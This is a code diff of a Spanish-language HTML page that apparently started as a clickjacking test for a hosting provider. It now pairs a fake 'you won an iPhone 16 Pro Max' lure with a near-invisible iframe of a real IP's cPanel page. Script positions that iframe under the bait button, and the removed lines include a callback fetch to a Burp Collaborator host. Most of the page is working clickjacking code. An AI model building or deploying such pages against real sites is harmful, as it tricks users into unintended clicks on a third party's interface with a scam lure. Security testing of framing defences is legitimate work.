@@ -1,22 +1,95 @@
 <!DOCTYPE html>
-<html>
-<head><title>Prueba Clickjacking - Documentación para Hosting</title></head>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>¡FELICIDADES! Has ganado un iPhone 16 Pro Max</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%; overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+    .container {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: white;
+      z-index: 1;
+    }
+    h1 { font-size: 48px; margin: 0 0 20px; text-shadow: 0 4px 10px rgba(0,0,0,0.4); }
+    p { font-size: 24px; margin: 0 0 40px; }
+    .fake-button {
+      padding: 20px 60px;
+      font-size: 28px;
+      font-weight: bold;
+      background: #ff003c;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(255,0,60,0.4);
+      animation: pulse 2s infinite;
+      transition: all 0.3s;
+    }
+    .fake-button:hover { transform: scale(1.1); }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(255,0,60,0.7); }
+      70% { box-shadow: 0 0 0 20px rgba(255,0,60,0); }
+      100% { box-shadow: 0 0 0 0 rgba(255,0,60,0); }
+    }
+    
+    iframe {
+      position: absolute;
+      top: -100px;        
+      width: 2000px;
+      height: 1600px;
+      opacity: 0;
+      border: none;
+      z-index: 2;
+      pointer-events: none; 
+      transition: opacity 0.5s;
+    }
+    .bait {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 3;
+    }
+  </style>
+</head>
 <body>
-<h1>¡FELICIDADES! Has ganado un iPhone 16</h1>
-<p>Haz clic en el botón rojo para reclamar tu premio ahora:</p>
 
-<button style="position:relative; width:300px; height:80px; font-size:24px; background:red; color:white; border:none; cursor:pointer; z-index:1;">
-  RECLAMAR PREMIO AHORA
-</button>
+<div class="container">
+  <h1>¡FELICIDADES!</h1>
+  <p>Has sido seleccionado para ganar un <strong>iPhone 16 Pro Max</strong> gratis</p>
+  <div class="bait">
+    <button class="fake-button" onclick="alert('¡Premio reclamado! (esto es solo una demo)')">
+      RECLAMAR AHORA
+    </button>
+  </div>
+</div>
 
-<iframe src="https://37.27.227.98/cgi-sys/suspendedpage.cgi" 
-        style="position:absolute; top:0; left:0; width:1920px; height:1080px; opacity:0.0001; border:0; z-index:2;"
-        sandbox="allow-forms allow-scripts allow-modals">
+<iframe src="https://37.27.227.98/cgi-sys/suspendedpage.cgi"
+        sandbox="allow-forms allow-scripts allow-modals allow-same-origin"
+        onload="positionIframe()">
 </iframe>
 
-<!-- Solo para demostrar que el iframe se carga -->
 <script>
-  fetch("https://d1q2w3e4r5t6y7.burpcollaborator.net/log?dominio=37.27.227.98");
+ 
+  function positionIframe() {
+    const iframe = document.querySelector('iframe');
+    const button = document.querySelector('.bait');
+    const rect = button.getBoundingClientRect();
+    
+    iframe.style.top = (rect.top - 50) + 'px';   
+    iframe.style.left = (rect.left - 50) + 'px';
+    iframe.style.opacity = '0.0001';
+    iframe.style.pointerEvents = 'auto';
+  }
+  
 </script>
+
 </body>
 </html>
